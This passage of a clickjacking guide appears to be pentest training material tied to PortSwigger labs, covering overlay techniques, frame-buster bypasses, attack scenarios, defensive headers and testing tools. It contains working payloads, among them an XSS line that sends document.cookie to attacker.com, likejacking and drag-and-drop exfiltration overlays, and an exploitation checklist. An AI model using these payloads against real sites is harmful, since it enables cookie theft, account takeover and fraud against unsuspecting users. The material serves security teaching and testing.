<div class="step3">Click Third</div>
<iframe src="target"></iframe>
```

**Use Cases:**
- Account deletion with confirmation
- Multi-page checkout processes
- Settings requiring multiple confirmations
- Wizard-style interfaces
- OAuth authorization flows

#### 5. Combined with DOM-Based XSS

**Technique:** Use clickjacking to trigger DOM XSS by overlaying submit button.

**Attack Chain:**
```
1. Inject XSS payload via URL parameter
2. Overlay invisible submit button
3. User click triggers form submission
4. DOM processing executes XSS
```

**Example:**
```html
<iframe src="https://target.com/feedback?name=<img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)>"></iframe>
```

**Powerful Combinations:**
- Feedback forms with DOM XSS
- Search functionality processing input
- Comment sections with reflected XSS
- Profile update with stored XSS
- URL fragment-based XSS in SPAs

#### 6. Cursorjacking (Advanced)

**Technique:** Manipulate cursor display to misrepresent click location.

**Note:** This relied on Flash and old Firefox bugs, mostly patched in modern browsers, but included for completeness.

```css
/* Historical example - no longer effective */
cursor: url('fake-cursor.png'), auto;
```

#### 7. Likejacking / Shareacking

**Technique:** Trick users into liking or sharing social media content.

**Facebook Example:**
```html
<style>
    iframe {
        width: 500px;
        height: 300px;
        opacity: 0.0001;
        z-index: 2;
    }
    .decoy {
        position: absolute;
        top: 150px;
        left: 200px;
        z-index: 1;
    }
</style>
<div class="decoy">
    <button style="background: #ff6600; color: white; padding: 20px; font-size: 18px;">
        WIN A FREE iPHONE!
    </button>
</div>
<iframe src="https://www.facebook.com/plugins/like.php?href=https://attacker.com/malware"></iframe>
```

**Applications:**
- Spreading malware links
- Inflating page engagement
- Reputation manipulation
- Spam distribution

#### 8. Drag-and-Drop Hijacking

**Technique:** Exploit drag-and-drop functionality to exfiltrate data.

```html
<style>
    #dropzone {
        position: absolute;
        top: 100px;
        left: 100px;
        width: 200px;
        height: 200px;
        z-index: 999;
        border: 2px dashed #ccc;
    }
    iframe {
        opacity: 0.0001;
        position: absolute;
        top: 0;
        left: 0;
        z-index: 1;
    }
</style>
<div id="dropzone">Drop files here to upload</div>
<iframe src="https://attacker.com/receiver"></iframe>
<script>
    document.getElementById('dropzone').addEventListener('drop', function(e) {
        e.preventDefault();
        // Exfiltrate dropped data
        let files = e.dataTransfer.files;
        // Upload to attacker server
    });
</script>
```

### Attack Variations and Alternatives

#### Variation 1: Double Framing

**Purpose:** Bypass certain frame-busting techniques.

```html
<!-- Attacker's page -->
<iframe src="https://attacker.com/middle.html"></iframe>

<!-- middle.html -->
<iframe src="https://target.com/vulnerable"></iframe>
```

Some frame busters only check `parent` not `top`, making double framing effective.

#### Variation 2: onBeforeUnload Filtering

**Purpose:** Suppress confirmation dialogs.

```javascript
// On framing page
window.onbeforeunload = null;
```

#### Variation 3: Button Hijacking with CSS

**Purpose:** Make legitimate buttons trigger unintended actions.

```html
<style>
    #real-button {
        position: absolute;
        top: -9999px;
    }
    #fake-button {
        position: absolute;
        top: 100px;
        left: 100px;
    }
</style>
<button id="fake-button" onclick="document.getElementById('real-button').click()">
    Safe Action
</button>
<iframe src="target">
    <!-- Contains #real-button that performs dangerous action -->
</iframe>
```

#### Variation 4: Timing-Based Attacks

**Purpose:** Exploit race conditions or async operations.

```html
<script>
    // Wait for slow-loading iframe
    setTimeout(function() {
        document.querySelector('.decoy').style.display = 'block';
    }, 2000);
</script>
```

#### Variation 5: Mobile Tap-Jacking

**Purpose:** Exploit touch interfaces on mobile devices.

```html
<style>
    iframe {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        opacity: 0.0001;
        z-index: 9999;
    }
    .decoy {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        z-index: 1;
    }
</style>
```

**Mobile Considerations:**
- Touch targets are larger (44x44px minimum iOS)
- No hover state to test alignment
- Full-screen overlays more effective
- Gesture-based navigation can interfere

### Bypass Techniques for Protections

#### Bypassing X-Frame-Options

**X-Frame-Options: DENY**
- Cannot be bypassed (blocks all framing)
- Attack must use different vector

**X-Frame-Options: SAMEORIGIN**
- Exploit XSS on same origin
- Find subdomain takeover vulnerability
- Exploit CORS misconfiguration

**X-Frame-Options: ALLOW-FROM**
- Deprecated and not widely supported
- If implemented, must find XSS on whitelisted domain

#### Bypassing CSP frame-ancestors

**CSP: frame-ancestors 'none'**
- Cannot be bypassed (equivalent to X-Frame-Options DENY)

**CSP: frame-ancestors 'self'**
- Same as SAMEORIGIN bypass techniques
- Exploit any same-origin XSS

**CSP: frame-ancestors 'self' https://trusted.com**
- Must compromise trusted.com
- Or find subdomain of trusted.com under attacker control

**CSP Bypass via Meta Tag:**
- CSP defined in meta tags CAN be bypassed
- frame-ancestors directive only works in HTTP headers
- If only meta tag protection exists, framing is possible

```html
<!-- Ineffective protection (in target page) -->
<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none'">
<!-- This does NOT prevent framing -->
```

#### Bypassing SameSite Cookies

**SameSite=Strict**
- Cookies not sent in cross-site iframes
- Bypass via same-site subdomain control
- Exploit client-side redirect on same site

**SameSite=Lax**
- Cookies sent with top-level navigation GET requests
- Some POST requests may be blocked
- Method override can bypass: `POST → GET with _method=POST`

**SameSite=None** (or not set)
- No protection against clickjacking
- Cookies included in iframe contexts

#### Bypassing JavaScript Frame Busters

**Technique 1: Sandbox attribute** (primary)
```html
<iframe sandbox="allow-forms" src="target"></iframe>
```

**Technique 2: onBeforeUnload suppression**
```javascript
window.onbeforeunload = function() { return null; };
```

**Technique 3: Double framing**
```html
<iframe src="middle.html">
    <iframe src="target.html"></iframe>
</iframe>
```

**Technique 4: 204 No Content response**
Intercept top.location navigation and respond with 204 (requires server control).

**Technique 5: window.stop()**
```javascript
setTimeout(function() { window.stop(); }, 1);
```

### Real-World Application Scenarios

#### Scenario 1: Account Takeover via Email Change

**Attack Flow:**
1. Identify email change functionality
2. Test for URL parameter prefilling: `?email=attacker@evil.com`
3. Create clickjacking overlay on "Update Email" button
4. User clicks → email changed
5. Attacker initiates password reset to new email
6. Account compromised

**Impact:** Complete account takeover

#### Scenario 2: Unauthorized Financial Transactions

**Attack Flow:**
1. Target bank transfer or payment page
2. Prepopulate form: `?recipient=attacker&amount=5000`
3. Overlay invisible "Confirm" button
4. User click triggers transfer
5. Funds transferred to attacker

**Impact:** Direct financial loss

#### Scenario 3: Privacy Settings Manipulation

**Attack Flow:**
1. Target privacy settings page (e.g., Facebook, Twitter)
2. Overlay buttons that change settings to "Public"
3. User clicks thinking they're interacting with decoy content
4. Private posts become public
5. Attacker harvests now-public sensitive information

**Impact:** Privacy violation, data exposure

#### Scenario 4: Malware Distribution

**Attack Flow:**
1. Target file download confirmation page
2. Overlay "Download" button for malware
3. User clicks thinking they're downloading legitimate file
4. Malware executes on victim machine

**Impact:** System compromise

#### Scenario 5: OAuth Authorization Bypass

**Attack Flow:**
1. Target OAuth authorization page (e.g., "Allow app to access your data")
2. Overlay "Authorize" button
3. User clicks → grants permissions to malicious app
4. Attacker's app gains access to victim's data

**Impact:** Data breach, unauthorized API access

#### Scenario 6: Admin Panel Exploitation

**Attack Flow:**
1. Target admin user with privileged access
2. Frame admin panel functionality
3. Overlay buttons for:
   - Creating new admin accounts
   - Disabling security features
   - Modifying system settings
4. Admin clicks → privilege escalation for attacker

**Impact:** Full system compromise

#### Scenario 7: Social Engineering - Survey Scam

**Attack Flow:**
1. Create convincing survey or quiz interface
2. Overlay social media "Share" or "Like" buttons
3. Users participate in survey, each answer is actually a like/share
4. Spread malicious content or inflate engagement metrics

**Impact:** Reputation damage, spam propagation

#### Scenario 8: Webcam/Microphone Access

**Historical Attack:**
1. Target Adobe Flash settings page (outdated but notable)
2. Frame Flash permission dialog
3. Overlay "Allow" button for camera/microphone
4. User grants permissions unknowingly
5. Attacker gains access to webcam/microphone

**Impact:** Severe privacy violation (largely mitigated in modern browsers)

---

## Defense Mechanisms and Testing

### Server-Side Protections (Recommended)

#### 1. X-Frame-Options Header

**Implementation:**

```
X-Frame-Options: DENY
```
Prevents all framing - most secure option.

```
X-Frame-Options: SAMEORIGIN
```
Allows framing only from same origin.

```
X-Frame-Options: ALLOW-FROM https://trusted.com
```
**⚠️ Deprecated** - Not supported in modern browsers.

**Server Configuration Examples:**

**Apache:**
```apache
Header always set X-Frame-Options "DENY"
```

**Nginx:**
```nginx
add_header X-Frame-Options "DENY" always;
```

**IIS:**
```xml
<system.webServer>
    <httpProtocol>
        <customHeaders>
            <add name="X-Frame-Options" value="DENY" />
        </customHeaders>
    </httpProtocol>
</system.webServer>
```

**Application-Level (Various Languages):**

**PHP:**
```php
header("X-Frame-Options: DENY");
```

**Node.js/Express:**
```javascript
app.use((req, res, next) => {
    res.setHeader('X-Frame-Options', 'DENY');
    next();
});
```

**Python/Flask:**
```python
@app.after_request
def set_frame_options(response):
    response.headers['X-Frame-Options'] = 'DENY'
    return response
```

**Java/Spring:**
```java
http.headers().frameOptions().deny();
```

#### 2. Content Security Policy (CSP) frame-ancestors

**Recommended Approach** - More flexible and powerful than X-Frame-Options.

**Implementation:**

```
Content-Security-Policy: frame-ancestors 'none';
```
Equivalent to X-Frame-Options: DENY

```
Content-Security-Policy: frame-ancestors 'self';
```
Equivalent to X-Frame-Options: SAMEORIGIN

```
Content-Security-Policy: frame-ancestors 'self' https://trusted.com https://another-trusted.com;
```
Allows specific domains (supports multiple domains unlike X-Frame-Options)

**Server Configuration Examples:**

**Apache:**
```apache
Header always set Content-Security-Policy "frame-ancestors 'none';"
```

**Nginx:**
```nginx
add_header Content-Security-Policy "frame-ancestors 'none';" always;
```

**Application-Level:**

**Node.js/Express (with helmet):**
```javascript
const helmet = require('helmet');
app.use(helmet.contentSecurityPolicy({
    directives: {
        frameAncestors: ["'none'"]
    }
}));
```

**Advantages of CSP over X-Frame-Options:**
- ✅ Supports multiple whitelisted domains
- ✅ Part of modern security standard
- ✅ Can be tested in report-only mode
- ✅ More granular control
- ✅ Better browser support going forward

**Report-Only Mode (Testing):**
```
Content-Security-Policy-Report-Only: frame-ancestors 'none'; report-uri /csp-violation-report
```

#### 3. SameSite Cookie Attribute

**Implementation:**

```
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

**SameSite Values:**

**Strict** (Most Secure):
```
Set-Cookie: session=abc123; SameSite=Strict
```
- Cookies NOT sent in cross-site iframe contexts
- Not sent with cross-site navigations
- Best protection, may impact legitimate use cases

**Lax** (Balanced):
```
Set-Cookie: session=abc123; SameSite=Lax
```
- Cookies sent with top-level navigation GET requests
- NOT sent in cross-site iframe contexts
- Good protection with better usability

**None** (No Protection):
```
Set-Cookie: session=abc123; SameSite=None; Secure
```
- Requires Secure flag
- Cookies sent in all contexts
- Use only when cross-site access is required

**Application-Level Examples:**

**PHP:**
```php
setcookie('session', $session_id, [
    'samesite' => 'Strict',
    'secure' => true,
    'httponly' => true
]);
```

**Node.js/Express:**
```javascript
res.cookie('session', sessionId, {
    sameSite: 'strict',
    secure: true,
    httpOnly: true
});
```

**Python/Flask:**
```python
response.set_cookie('session', session_id,
    samesite='Strict',
    secure=True,
    httponly=True
)
```

#### 4. Defense in Depth Strategy

**Recommended Configuration (All Three):**

```http
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none';
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

**Why use both X-Frame-Options and CSP?**
- Older browsers may not support CSP
- Redundancy ensures protection if one fails
- Defense in depth principle

### Client-Side Protections (Limited Effectiveness)

#### Frame-Busting Scripts (Not Recommended)

**Why Not Recommended:**
- Can be bypassed with sandbox attribute
- Can be bypassed with double framing
- Relies on JavaScript being enabled
- Easily defeated by determined attackers

**Common Patterns (for reference only):**

```javascript
// Pattern 1: Top location check
if (top.location != self.location) {
    top.location = self.location;
}

// Pattern 2: Parent check
if (parent.frames.length > 0) {
    parent.location = self.location;
}

// Pattern 3: Style-based
if (top != self) {
    top.location = self.location;
}

// Pattern 4: onBeforeUnload
window.onbeforeunload = function() {
    return "Navigation blocked";
};
```

**All of these can be bypassed** - Use server-side protections instead.

### Testing for Clickjacking Vulnerabilities

#### Manual Testing Process

**Step 1: Create Basic Test HTML**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Test</title>
</head>
<body>
    <h1>Clickjacking Vulnerability Test</h1>
    <iframe src="https://target.com/sensitive-page" width="800" height="600"></iframe>
</body>
</html>
```

Save as `test.html` and open in browser.

**Expected Results:**
- **Vulnerable:** Page loads successfully in iframe
- **Protected:** Page refuses to load, blank frame, or error message

**Step 2: Check Response Headers**

Using browser DevTools (F12):
1. Open Network tab
2. Load target page
3. Check Response Headers for:
   - `X-Frame-Options`
   - `Content-Security-Policy` with `frame-ancestors`

**Step 3: Test Frame Buster Bypass**

If page refuses to load, test sandbox bypass:

```html
<iframe sandbox="allow-forms allow-scripts" src="https://target.com/sensitive-page"></iframe>
```

**Note:** This still might not work if server-side headers are properly configured.

#### Automated Testing Tools

##### 1. Burp Suite Clickbandit

**Access:**
- Burp menu → Burp Clickbandit
- Copy script to clipboard

**Usage:**
1. Navigate to target page in browser
2. Open browser console (F12)
3. Paste Clickbandit script
4. Click "Record mode"
5. Perform actions on target page (clicks)
6. Click "Finish"
7. Review generated HTML exploit
8. Click "Save" to export PoC

**Features:**
- Automatic opacity adjustment
- Position recording
- Sandbox option
- Export HTML exploit

##### 2. OWASP ZAP

**Configuration:**
1. Open OWASP ZAP
2. Configure browser proxy
3. Spider/crawl target site
4. Run Active Scan
5. Check for "Clickjacking" vulnerabilities in alerts

**ZAP Detection:**
- Checks for missing X-Frame-Options
- Checks for missing CSP frame-ancestors
- Categorizes as Medium severity

##### 3. Browser DevTools

**Manual Header Inspection:**
1. Open DevTools (F12)
2. Network tab
3. Load target page
4. Click on request
5. Check Response Headers section
6. Look for protective headers

**Console Test:**
```javascript
// Run in browser console
if (window.self !== window.top) {
    console.log("Page is framed");
} else {
    console.log("Page is not framed");
}
```

##### 4. Command-Line Testing

**Using curl:**
```bash
curl -I https://target.com | grep -i "x-frame-options\|content-security-policy"
```

**Using Python:**
```python
import requests

response = requests.get('https://target.com')
xfo = response.headers.get('X-Frame-Options', 'Not Set')
csp = response.headers.get('Content-Security-Policy', 'Not Set')

print(f"X-Frame-Options: {xfo}")
print(f"Content-Security-Policy: {csp}")

if 'Not Set' in [xfo, csp]:
    print("⚠️ Potentially vulnerable to clickjacking")
else:
    print("✅ Headers present (verify frame-ancestors)")
```

##### 5. Online Testing Tools

- **SecurityHeaders.com**: Check security headers including framing protection
- **Mozilla Observatory**: Comprehensive security scan including clickjacking checks
- **Burp Suite Scanner**: Professional automated scanning

#### Testing Checklist

- [ ] Check X-Frame-Options header presence and value
- [ ] Check CSP frame-ancestors directive
- [ ] Test if page loads in basic iframe
- [ ] Test if page loads with sandbox attribute
- [ ] Verify SameSite cookie attributes
- [ ] Test multi-step actions requiring multiple clicks
- [ ] Test form prepopulation via URL parameters
- [ ] Check for frame-busting JavaScript (weak protection)
- [ ] Test across multiple browsers (Chrome, Firefox, Safari)
- [ ] Test on mobile devices if applicable
- [ ] Verify protection on all sensitive pages, not just login

### Secure Coding Best Practices

#### 1. Always Set Framing Headers

**For All Pages:**
```javascript
// Express.js middleware example
app.use((req, res, next) => {
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Content-Security-Policy', "frame-ancestors 'none';");
    next();
});
```

#### 2. Use SameSite Cookies for Session Management

```javascript
// Secure cookie configuration
{
    sameSite: 'Strict',
    secure: true,      // HTTPS only
    httpOnly: true,    // Prevents JavaScript access
    maxAge: 3600000    // 1 hour
}
```

#### 3. Implement CSRF Tokens (Defense in Depth)

While CSRF tokens don't prevent clickjacking, they provide additional protection:

```javascript
// Generate token
const csrfToken = crypto.randomBytes(32).toString('hex');

// Include in forms
<input type="hidden" name="csrf_token" value="{{csrfToken}}">

// Validate on submission
if (req.body.csrf_token !== req.session.csrf_token) {
    return res.status(403).send('Invalid CSRF token');
}
```

#### 4. Require Re-Authentication for Sensitive Actions

```javascript
// Before account deletion, password change, etc.
app.post('/delete-account', requireRecentAuth, (req, res) => {
    // Require authentication within last 5 minutes
    if (Date.now() - req.session.lastAuth > 300000) {
        return res.redirect('/re-authenticate');
    }
    // Proceed with deletion
});
```

#### 5. User Confirmation for Critical Actions

```javascript
// Multi-step confirmation
app.post('/delete-account', (req, res) => {
    if (!req.body.confirmed) {
        return res.render('confirm-deletion', {
            warning: 'This action cannot be undone',
            requireConfirmation: true
        });
    }
    // Proceed only after explicit confirmation
});
```

#### 6. Monitor and Log Suspicious Activity

```javascript
// Log failed frame loading attempts
app.use((req, res, next) => {
    const referer = req.headers.referer || '';
    const host = req.headers.host;

    if (referer && !referer.includes(host)) {
        logger.warn('Potential clickjacking attempt', {
            referer: referer,
            ip: req.ip,
            target: req.url
        });
    }
    next();
});
```

#### 7. Content Security Policy Best Practices

```javascript
// Comprehensive CSP
app.use((req, res, next) => {
    res.setHeader('Content-Security-Policy', [
        "default-src 'self'",
        "frame-ancestors 'none'",
        "form-action 'self'",
        "base-uri 'self'",
        "object-src 'none'"
    ].join('; '));
    next();
});
```

#### 8. Regular Security Audits

- Automated header checking in CI/CD pipeline
- Quarterly penetration testing
- Bug bounty programs
- Security header monitoring
- Regular dependency updates

#### 9. Framework-Specific Protections

**Django:**
```python
# settings.py
X_FRAME_OPTIONS = 'DENY'
CSRF_COOKIE_SAMESITE = 'Strict'
SESSION_COOKIE_SAMESITE = 'Strict'
SECURE_BROWSER_XSS_FILTER = True
```

**Ruby on Rails:**
```ruby
# config/application.rb
config.action_dispatch.default_headers = {
    'X-Frame-Options' => 'DENY',
    'Content-Security-Policy' => "frame-ancestors 'none'"
}
```

**ASP.NET:**
```csharp
// Startup.cs or Global.asax
protected void Application_BeginRequest()
{
    Response.AddHeader("X-Frame-Options", "DENY");
    Response.AddHeader("Content-Security-Policy", "frame-ancestors 'none';");
}
```

---

## References and Resources

### OWASP Documentation

1. **OWASP Clickjacking Defense Cheat Sheet**
   - URL: https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html
   - Comprehensive defense strategies and implementation guidance

2. **OWASP Clickjacking Attack**
   - URL: https://owasp.org/www-community/attacks/Clickjacking
   - Attack vectors, examples, and impact assessment

3. **OWASP Web Security Testing Guide - Testing for Clickjacking**
   - URL: https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/09-Testing_for_Clickjacking
   - Testing methodologies and validation procedures

4. **OWASP Content Security Policy Cheat Sheet**
   - URL: https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
   - CSP implementation including frame-ancestors directive

### PortSwigger Resources

5. **PortSwigger Clickjacking Tutorial**
   - URL: https://portswigger.net/web-security/clickjacking
   - Comprehensive tutorial with examples and labs

6. **PortSwigger Clickjacking Labs**
   - URL: https://portswigger.net/web-security/all-labs#clickjacking
   - Hands-on exploitation practice (5 labs covered in this guide)

7. **Burp Suite Clickbandit Documentation**
   - URL: https://portswigger.net/burp/documentation/desktop/tools/clickbandit
   - Tool documentation for automated PoC generation

8. **Testing for Clickjacking with Burp Suite**
   - URL: https://portswigger.net/burp/documentation/desktop/testing-workflow/testing-for-clickjacking
   - Workflow and best practices for testing

### Academic Research Papers

9. **"Busting Frame Busting: A Study of Clickjacking Vulnerabilities on Popular Sites"**
   - Authors: Gustav Rydstedt, Elie Bursztein, Dan Boneh, Collin Jackson
   - Institution: Stanford University
   - Year: 2010
   - URL: https://crypto.stanford.edu/~dabo/pubs/papers/framebust.pdf
   - **Key Findings:** Surveyed frame-busting practices of top 500 websites; found all defenses could be circumvented

10. **"Clickjacking: Attacks and Defenses"**
    - Authors: Lin-Shung Huang, Alex Moshchuk, Helen J. Wang, Stuart Schechter, Collin Jackson
    - Conference: USENIX Security Symposium 2012
    - **Key Contribution:** Formal model of clickjacking adopted by W3C UI safety specification

11. **"A Solution for the Automated Detection of Clickjacking Attacks"**
    - Authors: Marco Balduzzi, Manuel Egele, Engin Kirda, Davide Balzarotti, Christopher Kruegel
    - Conference: ASIACCS 2010
    - **Key Contribution:** Automated detection methodology; analyzed over 1 million web pages

12. **"Clickjacking Revisited: A Perceptual View of UI Security"**
    - Authors: Devdatta Akhawe, Warren He, Zhiwei Li, Reza Moazzezi, Dawn Song
    - Conference: USENIX WOOT 2014
    - URL: https://devd.me/papers/clickjacking-woot14.pdf
    - **Key Contribution:** Perceptual analysis of clickjacking effectiveness

13. **"Out of the Dark: UI Redressing and Trustworthy Events"**
    - Authors: Marcus Niemietz, Jörg Schwenk
    - Conference: CANS 2017
    - Publisher: Springer
    - **Key Contribution:** Analysis of trustworthy events in browser context

14. **"UI Redressing Attacks on Android Devices"**
    - Authors: Marcus Niemietz, Jörg Schwenk
    - Conference: Black Hat Abu Dhabi 2012
    - **Key Contribution:** Mobile platform exploitation techniques

### Industry Security Guidelines

15. **Mozilla Developer Network (MDN) - Clickjacking**
    - URL: https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Clickjacking
    - Browser perspective and modern web standards

16. **CSP frame-ancestors vs X-Frame-Options**
    - URL: https://medium.com/@shaialon/csp-frame-ancestors-vs-x-frame-options-for-clickjacking-prevention-30383a713772
    - Comparative analysis of protection mechanisms

17. **BrowserStack - frame-ancestors Guide**
    - URL: https://www.browserstack.com/guide/frame-ancestors
    - Implementation guide with browser compatibility

### CVE Examples and Real-World Incidents

18. **Facebook Likejacking Incidents**
    - Multiple incidents of clickjacking abuse on Facebook's Like functionality
    - Notable for viral spread through social engineering

19. **Adobe Flash Settings Page Exploit**
    - Historical attack granting microphone/camera permissions
    - Demonstrated severe privacy implications

20. **Twitter Worm via Clickjacking**
    - Self-propagating clickjacking attack causing mass retweeting
    - Showed potential for rapid exploitation spread

### Tools and Frameworks

21. **Burp Suite Professional**
    - URL: https://portswigger.net/burp/pro
    - Industry-standard web security testing platform with Clickbandit tool

22. **OWASP ZAP (Zed Attack Proxy)**
    - URL: https://www.zaproxy.org/
    - Open-source web application security scanner with clickjacking detection

23. **Clickjacking Test Tool (Online)**
    - Various online tools for quick header checking
    - Examples: SecurityHeaders.com, Mozilla Observatory

24. **GitHub - Clickbandit (Open Source)**
    - URL: https://github.com/securestep9/clickbandit
    - Open-source version of Burp's Clickbandit

### Security Testing Resources

25. **HackTricks - Clickjacking**
    - URL: https://book.hacktricks.xyz/pentesting-web/clickjacking
    - Penetration testing techniques and methodology

26. **Intigriti Academy - Clickjacking Explained**
    - URL: https://www.intigriti.com/researchers/hackademy/clickjacking
    - Bug bounty perspective and practical exploitation

### Secure Development Resources

27. **Auth0 Blog - Preventing Clickjacking Attacks**
    - URL: https://auth0.com/blog/preventing-clickjacking-attacks/
    - Developer-focused implementation guidance

28. **Imperva Learning Center - Clickjacking**
    - URL: https://www.imperva.com/learn/application-security/clickjacking/
    - Enterprise security perspective

29. **Fortinet Cyber Glossary - Clickjacking**
    - URL: https://www.fortinet.com/resources/cyberglossary/clickjacking
    - Definitions, types, and prevention

### W3C and Standards Bodies

30. **W3C UI Safety Specification**
    - Formal specification incorporating clickjacking research
    - Basis for modern browser protections

31. **CSP Level 2 Specification**
    - W3C specification including frame-ancestors directive
    - Official standard for content security policies

### Browser Documentation

32. **Chrome Security FAQ**
    - Google's guidance on clickjacking and frame security

33. **Firefox Security**
    - Mozilla's approach to clickjacking prevention

34. **Safari Security**
    - WebKit/Safari frame security implementation

### Community Resources

35. **PortSwigger Research Blog**
    - URL: https://portswigger.net/research
    - Latest research and vulnerability discoveries

36. **Bug Bounty Platforms**
    - HackerOne, Bugcrowd, Intigriti
    - Real-world clickjacking vulnerability reports and write-ups

37. **Reddit - r/netsec**
    - Community discussions on latest clickjacking techniques

38. **Twitter Security Community**
    - Follow @PortSwiggerRes, @OWASP, @BugBountyHQ for updates

### Additional Learning Resources

39. **YouTube - PortSwigger Web Security Academy**
    - Video tutorials on clickjacking and other web vulnerabilities

40. **PentesterLab**
    - URL: https://pentesterlab.com/
    - Hands-on exercises including clickjacking scenarios

---

## Quick Reference - Exploitation Checklist

### Pre-Exploitation

- [ ] Identify target functionality (account deletion, email change, etc.)
- [ ] Check for X-Frame-Options header (curl -I or browser DevTools)
- [ ] Check for CSP frame-ancestors directive
- [ ] Verify SameSite cookie attributes
- [ ] Test if page loads in basic iframe
- [ ] Identify sensitive actions requiring clicks
- [ ] Map out multi-step processes if applicable

### Basic Exploitation

- [ ] Create HTML template with iframe and decoy element
- [ ] Set iframe src to target page
- [ ] Configure CSS: position, opacity (0.1 for testing), z-index
- [ ] Align decoy button with target button
- [ ] Test cursor changes and hover states
- [ ] Finalize opacity to 0.0001
- [ ] Test exploit personally before delivery
- [ ] Deliver to victim

### Advanced Techniques

- [ ] Test form prepopulation via URL parameters
- [ ] Attempt sandbox bypass if frame busters detected
- [ ] Create multi-step overlays for confirmation dialogs
- [ ] Combine with XSS if applicable
- [ ] Implement social engineering elements
- [ ] Test across multiple browsers
- [ ] Verify exploitation success

### Post-Exploitation

- [ ] Document vulnerability details
- [ ] Calculate impact and severity
- [ ] Prepare responsible disclosure report
- [ ] Recommend remediation measures
- [ ] Verify fixes after implementation

---

## Conclusion

Clickjacking remains a significant web security threat despite being well-understood for over a decade. This guide provides comprehensive coverage of all PortSwigger Web Security Academy clickjacking labs, along with extensive technical details on exploitation techniques, bypass methods, and defensive measures.

**Key Takeaways:**

1. **CSRF Tokens Don't Protect:** Clickjacking operates within legitimate session contexts
2. **Server-Side Protection Required:** Client-side frame busters can be bypassed
3. **Defense in Depth:** Use X-Frame-Options + CSP frame-ancestors + SameSite cookies
4. **Proper Testing Essential:** Automated tools and manual verification both necessary
5. **Continuous Monitoring:** Security headers must be maintained across all pages

**For Penetration Testers:**
- Master Burp Clickbandit for efficient PoC generation
- Understand sandbox bypass for frame-busting code
- Document clear exploitation steps for reporting
- Assess real-world impact beyond lab scenarios

**For Developers:**
- Implement framing protection on ALL pages, not just sensitive ones
- Use both X-Frame-Options and CSP for compatibility
- Set SameSite=Strict on session cookies
- Regular security header audits in CI/CD pipeline
- Require re-authentication for critical actions

**For Security Professionals:**
- Include clickjacking in vulnerability assessment scope
- Verify protections across entire application surface
- Test mobile applications (tap-jacking)
- Monitor for new bypass techniques
- Stay updated with latest research

This guide equips you with the knowledge to identify, exploit, and remediate clickjacking vulnerabilities effectively. Practice on PortSwigger labs, apply techniques ethically, and always prioritize responsible disclosure.

---

**Document Version:** 1.0
**Last Updated:** January 2026
**Author:** Security Research Team
**License:** Educational Use Only

For questions, updates, or contributions, refer to the main pentest skill documentation.
